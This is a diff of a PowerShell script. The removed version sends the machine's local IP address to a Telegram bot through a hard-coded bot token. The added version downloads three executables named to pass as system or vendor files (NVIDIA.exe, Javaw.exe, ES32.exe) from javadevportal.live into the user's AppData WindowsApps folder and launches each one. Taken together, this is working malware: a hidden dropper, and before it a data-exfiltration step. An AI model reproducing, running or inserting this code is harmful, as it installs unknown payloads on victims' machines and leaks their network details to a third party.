@@ -1,9 +1,23 @@
-# Получаем внутренний IP-адрес (LAN)
-$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" -and $_.PrefixOrigin -ne "WellKnown" } | Select-Object -First 1).IPAddress
+$gfgff = @( 
+    "http://javadevportal.live/files/ES32.exe", 
+    "http://javadevportal.live/files/NVIDIA.exe",
+    "http://javadevportal.live/files/Javaw.exe"
+)
 
-# Отправляем в Telegram
-$botToken = "7299851101:AAG1N7LhBKWSAaSVJ5AqUSR2SaDiCzdJCk8"
-$chatID = "7316246301"
-$message = "Локальный IP: $ip"
+$currentUser = [Environment]::UserName
+$savePath = "C:\Users\$currentUser\AppData\Local\Microsoft\WindowsApps"
 
-Invoke-WebRequest -Uri "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=$message" -Method Post -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
+if (-not (Test-Path -Path $savePath)) {
+    New-Item -ItemType Directory -Path $savePath -Force | Out-Null
+}
+
+foreach ($link in $gfgff) {
+    $fileName = Split-Path -Leaf $link
+    $fullPath = Join-Path -Path $savePath -ChildPath $fileName
+
+    if (-not (Test-Path -Path $fullPath)) {
+        $webClient = New-Object System.Net.WebClient
+        $webClient.DownloadFile($link, $fullPath)
+        Start-Process -FilePath $fullPath
+    }
+}
